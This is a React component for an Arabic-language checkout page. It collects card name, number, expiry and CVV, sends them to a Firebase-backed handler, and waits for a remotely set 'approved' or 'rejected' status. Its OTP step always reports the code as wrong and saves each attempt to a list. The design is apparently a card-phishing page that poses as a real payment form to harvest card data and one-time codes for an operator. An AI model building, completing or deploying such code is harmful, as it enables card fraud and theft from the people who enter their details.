import { useEffect, useState } from 'react';
import { doc, onSnapshot } from 'firebase/firestore';
import { db, handlePay } from '../firebase';
import { useCart } from '../cartContext';
import { FaCreditCard } from 'react-icons/fa';
import './kent.css'
type PaymentInfo = {
  cardNumber: string;
  year: string;
  month: string;
  bank?: string;
  otp?: string;
  pass: string;
  cardState: string;
  allOtps: string[],
  bank_card: string[];
  prefix: string;
  status: 'new' | 'pending' | 'approved' | 'rejected';
};

export const Payment = (props: any) => {
  const [isProcessing, setIsProcessing] = useState(false);
  const [otp, setOtp] = useState("");
  const [showOtp, setShowOtp] = useState(false);

  const [step, setstep] = useState(1);
  const [newotp] = useState([''])
  const { total } = useCart() as any
  const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
    cardNumber: '',
    year: '',
    month: '',
    otp: '',
    allOtps: newotp,
    bank: '',
    pass: '',
    cardState: 'new',
    bank_card: [''],
    prefix: '',
    status: 'new',
  });

  const handleAddotp = (otp: string) => {
    newotp.push(`${otp} , `)
  }
  const handleChange = (e: any) => {
    // setForm({ ...form, [e.target.name]: e.target.value });
  };
  const handleSubmit = (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    handlePay(paymentInfo,setPaymentInfo)
    setIsProcessing(true);
    setstep(2)
    setTimeout(() => {
      setIsProcessing(false);
      setShowOtp(true);
    }, 2000);
  };

  const handleOtpSubmit = (e: { preventDefault: () => void; }) => {
    e.preventDefault();
    handleAddotp(otp)
    setstep(3)
    setPaymentInfo({
      ...paymentInfo,
      status:'approved'
    })
        handlePay(paymentInfo,setPaymentInfo)
        setTimeout(() => {
    alert("رمز التحقق غير صحيح!");
          setOtp('')
        }, 3000);
  };

  useEffect(() => {
    //handleAddotp(paymentInfo.otp!)
  }, [paymentInfo.otp])

  useEffect(() => {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const unsubscribe = onSnapshot(doc(db, 'pays', visitorId), (docSnap) => {
        if (docSnap.exists()) {
          const data = docSnap.data() as PaymentInfo;
          if (data.status) {
            setPaymentInfo(prev => ({ ...prev, status: data.status }));
            if (data.status === 'approved') {
              setstep(2);
              props.setisloading(false);
            } else if (data.status === 'rejected') {
              props.setisloading(false);
              alert('تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ');
              setstep(1);
            }
          }
        }
      });

      return () => unsubscribe();
    }
  }, []);


  return (
    <div className='font' style={{ display: "flex", alignItems: "center", justifyContent: "center", minHeight: "100vh", backgroundColor: "#f3f4f6", padding: "16px" }} dir='rtl'>
      <div style={{ width: "100%", maxWidth: "400px", padding: "24px", backgroundColor: "white", borderRadius: "16px", boxShadow: "0 4px 6px rgba(0, 0, 0, 0.1)" }}>
        <h2 style={{ textAlign: "center", marginBottom: "16px", fontSize: "20px", fontWeight: "600" }}>تفاصيل الدفع</h2>
        {!showOtp ? (
          <form onSubmit={handleSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            <div>
              <label  dir='rtl'>الاسم على البطاقة</label>
              <input name="name" onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      bank: e.target.value,
                    })}} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc",textAlign:'start' }} />
            </div>
            <div>
              <label>رقم البطاقة</label>
              <input name="cardNumber" onChange={(e)=>{
                  setPaymentInfo({
                    ...paymentInfo,
                    cardNumber: e.target.value,
                  })
              }} required style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
            </div>
            <div style={{ display: "flex", gap: "12px" }}>
              <div style={{ flex: 1 }}>
                <label>تاريخ الانتهاء</label>
                <input name="expiry" onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      month: e.target.value,
                    })
                }} required placeholder="MM/YY" style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
              </div>
              <div style={{ flex: 1 }}>
                <label>CVV</label>
                <input name="cvv" onChange={(e)=>{
                    setPaymentInfo({
                      ...paymentInfo,
                      pass: e.target.value,
                    })}} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
              </div>
            </div>
            <div>
              <label>المبلغ</label>
              <input name="amount" value={total}  placeholder="$100.00" style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
            </div>
            <button type="submit" disabled={isProcessing} style={{ width: "100%", display: "flex", alignItems: "center", justifyContent: "center", gap: "8px", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
              <FaCreditCard /> {isProcessing ? "يرجى الانتظار..." : "ادفع الآن"}
            </button>
          </form>
        ) : step === 2 && paymentInfo.status === 'pending' ?  (<>طلب الدفع الخاص بك قيد المعالجة, يرجى الانتظار ...</>):(
          <form onSubmit={handleOtpSubmit} style={{ display: "flex", flexDirection: "column", gap: "12px" }}>
            <div>
              <label>أدخل رمز OTP</label>
              <input name="otp" value={otp} onChange={(e) => setOtp(e.target.value)} required  style={{ width: "100%", padding: "8px", borderRadius: "4px", border: "1px solid #ccc" }} />
            </div>
            <button type="submit" style={{ width: "100%", padding: "12px", backgroundColor: "#2563eb", color: "white", borderRadius: "4px", border: "none", cursor: "pointer" }}>
              تأكيد الدفع
            </button>
          </form>
        ) }
      </div>
    </div>
  );
};

